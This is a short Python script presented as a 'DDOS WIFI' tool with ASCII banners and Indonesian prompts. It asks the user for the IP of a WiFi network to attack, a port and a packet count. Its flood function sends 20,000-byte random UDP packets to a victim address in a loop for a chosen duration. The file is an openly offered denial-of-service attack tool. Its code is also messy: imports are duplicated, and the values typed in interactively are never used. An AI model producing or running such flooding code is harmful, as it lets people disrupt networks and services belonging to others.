import os, sys
import os
import sys
import time
import socket
import random
import time
import socket
import random
import string
import optparse
from turtle import clear
#----------------------------------------------------------------------#
def ddos():
    print()
    print ("    ██████╗░██████╗░░█████╗░░██████╗")
    print ("    ██╔══██╗██╔══██╗██╔══██╗██╔════╝")
    print ("    ██║░░██║██║░░██║██║░░██║╚█████╗░")
    print ("    ██║░░██║██║░░██║██║░░██║░╚═══██╗")
    print ("    ██████╔╝██████╔╝╚█████╔╝██████╔╝")
    print ("    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░")
    print ()
    print ("MASUKAN IP DARI WIFI YANG ANDA INGIN SERANG")
    print ()
#----------------------------------------------------------------------#
def put():
    print("--------------------------------------------------------------------------")
print('''
  888888ba  888888ba   .88888.  .d88888b       dP     dP dP  888888ba  
  88    `8b 88    `8b d8'   `8b 88.    "'      88     88 88  88    `8b 
  88     88 88     88 88     88 `Y88888b.      88    .8P 88 a88aaaa8P' 
  88     88 88     88 88     88       `8b 8888 88     d8 88  88        
  88    .8P 88    .8P Y8.   .8P d8'   .8P      88    d8  88  88        
  8888888P  8888888P   `8888P'   Y88888P         8888'   dP  dP        
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ''')
print()
print("DDOS WIFI TOOLS BY YONATHAN GM")
print("===================================")
print("TYPE [gas] TO START THE PROGRAM ")
print()
put=input("INPUT : ")

if put == "gas":
        os.system('cls')
        ddos()
        x = input("IP : ")
        print("-------------------------------------------------------------")
        print("MASUKAN PORT WIFI ANDA (CONTOH : 80)")
        print()
        y = input("PORT : ")
        print("-------------------------------------------------------------")
        print("MASUKAN PAKET YANG ANDA KIRIM KE WIFI TUJUAN (MAXIMAL 1000)")
        print()
        z = input("PACKET: ")

#-------------------------------------------------------------#
def usage():
    print ()
#-------------------------------------------------------------#
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("ENTODDDDDDDD !!!")
#-------------------------------------------------------------#
def main():
    try:
          print (len(sys.argv))
          if len(sys.argv) != 4:
             usage()
          else:
             flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    except IndexError:
          sys.exit("CRROOTTTTTTT !!!")
if __name__ == '__main__':
    main()
